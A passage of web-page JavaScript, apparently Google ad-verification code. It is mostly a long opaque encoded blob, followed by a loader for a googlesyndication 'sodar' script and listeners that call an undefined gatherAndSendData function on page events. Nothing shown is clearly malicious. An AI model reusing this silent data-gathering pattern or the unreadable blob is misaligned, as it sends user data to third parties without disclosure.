hhTgBolGEV3ljj33sACi7QQ79sUWeKgxQ7PkXDZNA3mXKLlbC2ecQfcn9K9WAt4YpZq3M9O47k3KBmsKUiUZojtcvOOffZiOSsKDo4XItICqJD/yMOKP2X7zeI53z62kH7DHdlEZ/6zXuYcA5BtYln52MFGaRLjYkw3cr4s0S0tQ1Jj7so/uqFSBFKcRzj6mkP0LjG1gM4pX/4c+lfMy3hJXbRYKHzSeUiUOZN+NYfVHAne6V2gw1fBYf0d+WjuBxC4HVh4NENLnRKl2xkLDudPHNixoBEjo4m6cxdZEhqNNPseLTGMW8s/q4Uqn7c9hsky1iiBweog6U1CJtrpH1D4yLuOV7g1vwA6Cd12QbqpKLE40BzSBxD87Fd19whfCEFshLFD77D9cm/qkxRCa2eSlLs9815yA54W49ZaMNn2P8rwIgZLUE+LiHOaLgYdZMwJjIKOmC/ys9XWE14iw5nYhNLIZw94J7+ijILxD6yNiI71J8KkKH3q/YcYZ3pzo+DIUDeuAPDz6Z/IX/YubsdNgIZgQkrxGr1CmWtRKvDR8yiHIXd7Qte+C90/hRFbT/tUe3m/P/oS7DSng11x6FAI32F55PTZD2na2DWT2H0vEX38+sGqfL0UYtq7vZWpsuIGA+tNRD733oWbp1FljKda6Rq+jFUnUTpjZAJMMo5hjRTuvIVTuzCGkhO9YgdotiBgdbYCnVoW1XEkWhMXtqVB4Uff8MIOVv1R6pe1sk8tkYIU26k/JPF/ucUR3aL5P+MdXLy+JPOhSBFCS0lUwDjjZDbpEWtQiN+8e2M1c3t+MS8YK3TVY+t3YFW/LFCJNtghjF+QQPk+RmJoCjh+HN0g+wKBOD5wCSDsJ2gkeoTUIUT1kW1L7wMkrLrGcOSp68tp7Y2JGd0saJ4uUSm9S3R83KJqCswuQSXzWKAFNAZyTTO3Chy7byRxLBm1RPhRqpRW6Mt8nrP/peL7U06mjSR18lhIiv/n6g5oO7ApFV6KFegt7GZglTnVmzuvad7qeKTBdnWHyNNasqzauYu3q87ZrhWxDSVN/CU/O5w3AnZoJxAz1ir4/F4Aa4wQY7ZiRUZ+qFgQFTHDh++PmOp4ZbWF4cfJjBQ/Opovh4PpslowwgxoooCyMKC1b33THssHdk4F/qwo1kTLwx054VNeJIaIdZFmOKiSXaZi8NwUx3v1d/O7n5c8ZA+P7J9SvjHQsuIqHqjqEBm3Sa9uRvH6RG8Qlhq/MVXOYBi6ZevrMpAJJMS1oJF8xwqYn8x9tcCRlMKzApX+Lh5dvCX9d1dGk1irvj+q5IP73dbDUtiNQOjTQvi9fgy67ktz6S/jM+SnbIJbzXaCaDAmm89L64Jm6AIqfJWGVXVTYQ5ofNtJ/8aN9yXAk+cPS721k6F6qbSwGHVNdif4FPdk7JBpOxBKW3LkStszVdp/Sil1GcGkqXvI1In/Y+5qmUSGQuZZcgBGfA/rJxhG9j2jHzgRx0Z388aKCM0SOutCTDJ432Oxw45s4MDOsgIyL8MlNZfF3wm9VnOar+8m/VFXG0N2q6x2x0EHNmohkdMXUCdw9pLS2EThltCkNS7GJab1EZ+xGzM+qmhucpCOGy6cr1ypr82spsqPs6d96u+C3gimAyjVP2SwojqiLnuVLwGbP2QWHeWiOi0fIo3Sy6B1gULzCCPoTMRZgTkK4Lj++pS9VTFFJZMU/2t9xuZBR2/WWTeMoVLQLgQ0+v2ardiU0lpmFgb2DgdMJR98f0nLGzPlJgz7zJEatiCL2aFZf9ISjmFK+jAl9o2FR04AqHUBcCT0Wb7uiayt9BH+Pl/l9QxwNn+q+pqz3car+K50kKeGFbcaIcer0om8Ba2t1t89Dm/Qmb0C+fzAfLZaFb0hzKfAUC/5xQQXQ69A7E5/IDPEMvpFE5FpqSNqf511Cv3/xKeA7bhXYNNoxXfR5R4KMKI3NFgRyYxpnhRm9/Bk1UdXD0EpskgeFbz0kqaaHLjP/a2ASSX5XMmnOtl91LmzmkbQuirPwdIhRtmsx5j8u7MOi9n/VoI4byGqN4w+giSBUeUeekFiUKMfNbOPx8oh2WKlwuuSbe0ZCiUndpR0DUpvy0W+XSlhFMujhymaT0RmBvVHCK/xeziDvfckHayucrKAhhxvMMqDWhoPkA3ctxPHc2/Pkq7Pmym08h4CQdgvhAAfdDRW275Bq4nkBfVvOqIpW/1lvXz/Fv5JNGAtr6BzMvGIKX4n+K5RxzCB2jMtLmgLGWL+P1+3a4+LC0VJMLg++xhMG8HQoeIbchrW5XDa2AsSVAqc0zx1RsGeBkR4hUQxefQh5jgtHN+jPUCDTEixmcP4FTDgUb8I8l158XqKvdUzX8zDkMEo9E/k5PRq+6hFF1iaOha1QkcOcx6PskuxEYFJ7w3oPeRNgb3LN1l+hY5uQtTUHfd/ODWD9ECPpdfEatMyUe1imryMZ7kQF60om1UZJuT7bAvSD+lmTBTarE9AeZ1xW9U5A63a6lLN3Tz19yYTITKzuNzP6fRkWLdScNvIvO4nZuyLudSd0IuVdxeZ4ZNrHrZjesecw4NPXlBQ9zQoiUNCSrn7i8m8vgxjDHX3Rt2ShScYaJW0Tzb35OpDAA4i2OqDDvx4Yd0aZesidxL77RDgXoCVANaeHT754IhdJ+/NUlNX9AzQk3s4jQIYc9CKHQuEEOuSdxbI4chP5hmo+ebOtrwTjKtvsn0VZuzXYHPCgpM1k10amQqB9OV7LHL2MR+JpSLCwirdFG0cRSuXj0gl1Lpm/r59qIk6tpvKUQIEBlI4aSlpojamO0XVC+cM4yu2HzflelJi4rS2qnFyTlNU67xaU8PIZ9Mn23RbWe3xHV0l+VI0b1hRNbT6eLz63yLxVrgLkKqQnCQRKlYAEib3pL03D5kueMyNx61MtT8FX042pkLxCjINDKW+xKeZjaCh2+74OjAliaCP8DKYcF770MZz2aNHezhRE6qxDiucYgzxHjKJoh9nBf4Z4C5ws/gLhBaAkP2UpMRVjaz8420s2e/6aSN4diw0VpqXYJewq/6CZMBIK+2XNFDaZLQeWlcySaWKqg6sGhQeOqq3hbUgFBqtBEuu17t0POVpEzU5VaMXRY5AVG4rrtsdkpFYRUqy4eUu4KTnnuYjheyFN3pa+A+RCmGvm2tJiiwKLf4rc0e6h19TVXBhuC2Mt2Rmrky2MXepEWM3qurz9jZbA8SXaPzfHKT8kvo19H9qr+FvIGRyss42zSeiPUfdRdiqOWYzpQxAMnZYmGl4bzFioNqqKAh1cOOWn3MMgOAmGL3vs4PXtLhXQVOwJV4gJSFj5W/VRzFPn7sDNrVdEd+7lD9pP7ai5K+VLQQWt7B4ZjEIYH0+LT5rOs4YAr7IculQqYaSViZANvKjBp2Sm2j5IkJw0lXofoqdxtiMI1eYLOPp20m7AM0r2uQWGDc0Fgog7+5D52/f8k/3oCRzooTpIH/CMTdO2wecYzpKEQLXbNdadygxJBAnyCmNOGKYU7qPFX/JMneZi3cW1sXVo0sDhDQPeh8kVN86+qC/0xPkf295eVLU4rBMk/b4ZZ2W5BDjoWIXddiCVvp9+O+WFOJlp4Os2zaLKXGh2lnWGUnS4y1arUdULBZlNtzMOqrCaXxzwtUKwzhpRjKaDMXXKNh5ZIJR0r+VOPmEvjx3jPqJloGFLz++VnsMYWYkcHo8icqYWrscdDpn9m5Jff57AFrNtkD7/mtpohbwY9lV6Zn9bCGj+BYiVxD+4T3HNduU+t1pPa3fyKikBdtQKoc1fAHbw7PyIJFqrfpEJ12d4n2pi3aNDHslFyjye5C/pVZkWW4osFNiLUBMoeO6zaHoauwWgyDXVwDESH45sqBW35FCiYRQPwDjFQ67zFS2ZVmwANeHbKICqqCAvZD4D4KVZ7Ij9aS9hmCGYzlyuv502b8RTYyow406IGfIiPfz14dWGOjKtukGpTJegO9K2ptT7PiK21NKcL1Q7896gGulqyj+ZnMuZ1b0gvv0ie7+JgiZ9vrGwwsTuQ7XT40OQMnJgNBI6oeU0PhenrHc668q4HytSuKXGdHa3r1+lPk+D5vIIBE8QX05uVlk+HmYdx4W3qqIqr1mDaM4BQLupe+YDcv8LXtCa3a2vgsAe0xfMD1hOmopTpKWYitKtFtR4sjeN8JKzFUhYKFdDgE35gz9Co4aMk6BJAAiNBhW1R8vSgNxiVgX2vwRfV36hs3x71U5Jhv3uQK5cuTpXbYJ8fDINdYrsrcoRulFVCVyieruuo8HZsCqGAiZKvC355EiINC12/MXRw+EDKlTLhPuImRkNSYfuXg5+LU+4fDsoaljPa5hfnVGtlbA+LcNxUU/WdI93ZubiXfhmfSLgd26VC/tHJLaUzhAv3Z1NXpA4M1qdLr+VZBQhpZzCXTGY6wBeuRDJcycXUmnPUPWj0azJ2OpUhBd4PevaF5LkIGCpj1KNLcN6r7hJ0OPgx03aOlYvdH8TXWayWHeocrhx48ZRD5nNdjHB1TEXkFlCDXyrk1GehQp9u/xJx5GI3w3CJ1KqM8PzXJFRSJqj29zPxCOswiRg1OO9LPfNLCur61cM2Ay3GXtwls/MZsW8WbIqQeUb3hZoc/e0Pp2vIj/X3hMqhexyBrVBlh6r9yGTey8wyZkEP57Ma8iaOXyAJqEW9fzccUBtlkvolEGNq71vpnL8rBR535+ouNi8e2OtArxdFgVNtOO5tC7MM8g9PVFX1JjrgT31bC2bhuh/OowuIyK32J/Xj10wtbD7ny+FId+mRO67JlZ0ihtOPo+8Ptgky0tbxTElM3qeQDcENugKi7Ec9Eh6njNe2K4kE0TUb9XIMxHty5X8hN5Ip/O0M3kf3uTIXuvM861wpR8Va3nghwQ/wN7EVy6ll3AjjMnHEg9vztCoDSvqB6GlIqso9n6zSiR+hv2iZBkcpQTnzpeRK9vc6SqFafC9zS8idKQWbntArDuooyEH1SUxjT04zH7LurNyja1GSjjRoBhh+PBV17MCOlJ12WEiNLUMGUMU5gxPl185BHXxmrUG+AZg3ts3QX7Efk6Bu6zY75vLMkl3hu2GVMpECdGtntsG4ICrdvIMHDSkks2HhDfE2AlJHicxHp9v9QnfdcVkPQkww7+pGw6qidoV25oCb/qs+Rn2VDiZifrvj0zkYAw4X5zGLWCLptgdwJ9TpkhYJiBnvq0dbOeSuIWuHIvIaBA6b4ouJ/0x3KBDyjvQGJa78zx6hVBYrww2S1kwinB+nI8S0dRAcwSfBZp0Lfu9deNg1zITOuET+7xblkCA8V6Ar6eqze2VwLVgw\x3d',
    '_ifr_': 'false',
    '_isfl_': 'false'
  });
  var gsodar = document.createElement('script');
  gsodar.type = 'text/javascript';
  gsodar.async = true;
  gsodar.src = '//tpc.googlesyndication.com/sodar/UFYwWwmt.js';
  var s = document.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(gsodar, s);
})();
document.addEventListener("visibilitychange", gatherAndSendData);
window.addEventListener("storage", gatherAndSendData);